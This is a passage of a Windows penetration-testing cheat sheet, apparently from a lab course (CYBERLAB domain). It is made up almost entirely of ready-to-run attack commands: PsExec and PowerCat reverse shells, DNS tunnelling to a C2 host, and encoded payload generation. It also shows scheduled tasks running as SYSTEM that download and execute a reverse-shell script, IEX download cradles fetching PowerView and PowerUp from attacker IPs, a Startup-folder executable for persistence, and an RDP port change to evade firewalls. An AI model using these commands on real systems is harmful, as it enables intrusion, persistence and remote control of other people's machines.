&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">notepad&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run remote shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powercat">PowerCat&lt;/h2>
&lt;p>Import the PowerCat module:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and print the output to the console. Rememeber to add -t (timeout) parameter: number of seconds to wait before giving up on listening or connecting:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, send a shell, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-e&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, execute a pseudo Powershell session, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Send a file to 10.1.1.15 port 8000:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">15&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Write the data sent to the local listener on port 4444 to C::&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">powercat -l -p 4444 -of C:\outfile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and repeatedly server a powershell shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">tcp&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53 (Get the server here: &lt;a href="https://github.com/iagox86/dnscat2%29" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2)&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">53&lt;/span> &lt;span class="n">-dns&lt;/span> &lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">dns&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>(-d) Disconnect. powercat will disconnect after the connection is established and the input from -i is sent. Used for scanning.&lt;/p>
&lt;p>Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will not be incorporated:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-g&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Generate Encoded Payload. Does the same as -g, but returns a string which can be executed in this way: powershell -E&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="o">-ge&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basic TCP Port Scanner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">443&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Start A Persistent Server That Serves a File:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-desktop">Remote Desktop&lt;/h2>
&lt;p>Enable RDP on a machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s1">&amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&amp;#39;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="s2">&amp;#34;fDenyTSConnections&amp;#34;&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="n">0Enable-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Change RDP port to 55555 (in order to bypass firewalls):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">PortNumber&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="mf">55555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">TCP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">UDP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ynet&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">y&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="scheduled-tasks">Scheduled Tasks&lt;/h2>
&lt;p>Launch a scheduled task on a remote host to download and execute the script for a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># File share via Web Server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">delete&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">create&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="nb">SC &lt;/span>&lt;span class="n">Minute&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">RU&lt;/span> &lt;span class="s2">&amp;#34;NT Authority\SYSTEM&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TR&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ep bypass -c &amp;#39;iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.50.53/powercat_connect.ps1&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">run&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="c"># File share via SMBNew-SmbShare -Path c:\users\student01\Desktop\shared -Name shared -FullAccess Everyoneschtasks /delete /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;# Only domain users can access the file share.# To run as SYSTEM the file must reside on the remote machine.schtasks /create /S &amp;#34;COMPUTER01&amp;#34; /SC Minute /RU &amp;#34;CYBERLAB\Administrator&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34; /TR &amp;#34;powershell.exe -ep bypass -c &amp;#39;. \\192.168.50.53\shared\powercat.ps1; powercat -c 192.168.50.53 -p 443 -e cmd&amp;#39;&amp;#34;schtasks /run /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="wmi">WMI&lt;/h2>
&lt;p>&lt;em>Requires ‘Host’ and ‘RPCSS’ SPNs&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">win32_process&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01.CYBERLAB.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="n">create&lt;/span> &lt;span class="n">-argumentlist&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -e &lt;/span>&lt;span class="nv">$encodedCommand&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="file-download">File download&lt;/h2>
&lt;p>Simple download:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Any version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://192.168.119.155/PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\Temp\PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Powershell 4+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## You can use &amp;#39;IWR&amp;#39; as a shorthand&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="s2">&amp;#34;http://10.10.16.7/Incnspc64.exe&amp;#34;&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Load file reflectively:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">IEX &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://10.10.16.7/PowerView.ps1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Encode one-liner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$command&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;IEX (New-Object Net.WebClient).DownloadString(&amp;#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$bytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$command&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$encodedCommand&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$bytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="nv">$encodedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb-shares">SMB Shares&lt;/h2>
&lt;p>Create a SMB share:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Grant-SmbShareAccess&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-AccountName&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-AccessRight&lt;/span> &lt;span class="n">Full&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;Everyone&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to a SMB share:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># USER: CYBERLAB\STUDENT1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">u:CYBERLAB&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">STUDENT01&lt;/span> &lt;span class="n">Password123&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbMapping&lt;/span> &lt;span class="n">-LocalPath&lt;/span> &lt;span class="s2">&amp;#34;x:&amp;#34;&lt;/span> &lt;span class="n">-RemotePath&lt;/span> &lt;span class="s2">&amp;#34;\\COMPUTER1\SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powershell-webserver">PowerShell WebServer&lt;/h2>
&lt;p>Start a web server on port 8080 in order to share files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start-WebServer.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="nb">Start-WebServer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="s2">&amp;#34;http://+:8080/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Download a file from another machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">iex &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://COMPUTER1:8080/PowerUp.ps1&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-AllChecks&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># It can be even used from an MSSQL instance&lt;/span>
